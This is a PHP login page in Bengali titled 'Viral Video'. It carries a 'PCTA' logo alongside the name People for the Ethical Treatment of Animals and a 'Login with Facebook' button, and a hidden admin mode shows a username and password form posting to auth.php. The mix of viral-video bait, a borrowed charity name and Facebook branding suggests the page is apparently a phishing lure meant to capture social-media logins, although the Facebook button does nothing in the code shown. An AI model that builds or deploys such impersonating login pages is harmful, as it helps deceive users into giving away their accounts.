<?php
session_start();
if (isset($_SESSION['user_id'])) {
    header("Location: index.php");
    exit();
}

$admin_mode = isset($_GET['admin']);
?>

<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>লগইন - ভাইরাল ভিডিও</title>
    <link rel="stylesheet" href="style.css">
</head>
<body class="login-page">
    <div class="login-container">
        <div class="login-header">
            <div class="logo">
                <div class="logo-img">PCTA</div>
                <div class="logo-text">
                    <h1>ভাইরাল ভিডিও</h1>
                    <p>People for the Ethical Treatment of Animals</p>
                </div>
            </div>
            <h2><?= $admin_mode ? 'এডমিন লগইন' : 'ফেসবুক লগইন' ?></h2>
        </div>

        <div class="login-form">
            <?php if ($admin_mode): ?>
                <form action="auth.php" method="post">
                    <input type="hidden" name="admin" value="1">
                    <div class="input-group">
                        <label for="username">ব্যবহারকারীর নাম</label>
                        <input type="text" id="username" name="username" required>
                    </div>
                    <div class="input-group">
                        <label for="password">পাসওয়ার্ড</label>
                        <input type="password" id="password" name="password" required>
                    </div>
                    <button type="submit">লগইন করুন</button>
                </form>
            <?php else: ?>
                <div class="fb-login">
                    <button class="fb-login-btn">
                        <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSIjZmZmIj48cGF0aCBkPSJNMTIuMDAxIDIuMDAyYy01LjUyMSAwLTkuOTk5IDQuNDc4LTkuOTk5IDkuOTk5IDAgNS41MTggNC40NzcgOS45OTcgOS45OTkgOS45OTdzOS45OTktNC40NzkgOS45OTktOS45OTdjMC01LjUyMS00LjQ3OC05Ljk5OS05Ljk5OS05Ljk5OXptMy44MzMgMTUuODA3aC0yLjYyMHYtNy45OTloMi4yNjh2LTIuNjY3aC0yLjI2OHYtMS44MzNjMC0xLjAzMy42NDktMS42MTYgMS43MTYtMS42MTZoMS40NTR2Mi44NjhoLTEuNDU0Yy0uMTYgMC0uMzQ0LjA4My0uMzQ0LjQxM3YxLjI0NmgxLjk5OXYyLjY2N2gtMi4wMDF2Ny45OTloLTEuMzYxdi43OTJoMy45ODN2LTcuOTk0eiIvPjwvc3ZnPg==" alt="Facebook">
                        ফেসবুক দিয়ে লগইন করুন
                    </button>
                </div>
            <?php endif; ?>
        </div>
    </div>
</body>
</html>
